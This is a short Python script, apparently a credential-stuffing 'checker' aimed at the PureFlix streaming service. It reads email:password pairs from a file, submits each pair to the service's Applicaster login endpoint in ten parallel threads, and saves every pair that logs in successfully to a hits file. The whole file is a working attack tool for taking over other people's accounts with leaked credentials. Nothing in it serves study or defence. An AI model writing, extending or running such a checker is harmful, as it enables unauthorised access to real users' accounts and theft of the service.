import requests
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import time

lock = Lock()

def pureflix_checker(session, email, password, lock, hits_file):
    try:
        response = session.post("https://login-flow.applicaster.com/auth/password/_3e74de5a-9ed4-4b6f-834a-4a7d7e2d752a_1ba339c9-b46b-4d04-91c2-d9a2a8c0ab25_undefined_undefined/login?flowType=password&_data=routes%2Fauth%2F%24flowType%2F%24uuid%2Flogin", json={"email": email, "password": password})
        if response.status_code == 200:
            with lock:
                hits_file.write(f"{email}:{password}\n")
                hits_file.flush()
    except Exception as e:
        print(f"An error occurred while checking {email}:{password}: {e}")

def print_progress(total, completed, lock, last_print_time):
    current_time = time.time()
    if current_time - last_print_time >= 1:  # print progress every 1 second
        with lock:
            print(f"Completed {completed}/{total} tasks")
        return current_time
    return last_print_time

def main():
    try:
        hits_file = open("hits.txt", "a")
        lock = Lock()
        last_print_time = time.time()

        try:
            with open("accounts.txt", "r") as f:
                accounts = [line.strip().split(":") for line in f.readlines()]
        except FileNotFoundError:
            print("accounts.txt file not found.")
            return
        except Exception as e:
            print(f"An error occurred while reading accounts.txt: {e}")
            return

        total_tasks = len(accounts)
        completed_tasks = 0

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(pureflix_checker, requests.Session(), email, password, lock, hits_file): (email, password) for email, password in accounts}

            while futures:
                done, pending = concurrent.futures.wait(futures, return_when=concurrent.futures.FIRST_COMPLETED)
                for future in done:
                    email, password = futures.pop(future)
                    completed_tasks += 1
                    last_print_time = print_progress(total_tasks, completed_tasks, lock, last_print_time)

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        hits_file.close()

if __name__ == "__main__":
    main()
